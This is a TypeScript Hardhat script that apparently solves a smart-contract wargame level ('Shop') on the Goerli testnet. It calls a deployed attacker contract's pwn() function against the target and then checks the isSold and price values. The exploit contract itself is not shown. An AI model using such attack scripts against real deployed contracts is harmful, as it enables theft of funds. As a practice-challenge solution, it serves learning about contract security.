import { ethers } from "hardhat"

const provider = new ethers.providers.JsonRpcProvider(
  process.env.GOERLI_RPC_URL
)

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x57D514c75e31B6D14c49a200041c24646Bf405cA"
  const targetAbi = [
    {
      inputs: [],
      name: "buy",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xa6f2ae3a",
    },
    {
      inputs: [],
      name: "isSold",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xe852e741",
    },
    {
      inputs: [],
      name: "price",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0xa035b1fe",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Shop")

  const tx = await contract.pwn(targetAddress, { gasLimit: 1000000 })

  try {
    const receipt = await tx.wait()
    console.log(
      `tx at https://goerli.etherscan.io/tx/${receipt.transactionHash}`
    )
  } catch (error: any) {
    console.error("Error:", error.reason)
    console.log(
      `Error tx  at https://goerli.etherscan.io/tx/${error?.transactionHash}`
    )
  }

  console.log("is sold", await target.isSold())
  console.log("price", (await target.price()).toString())
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
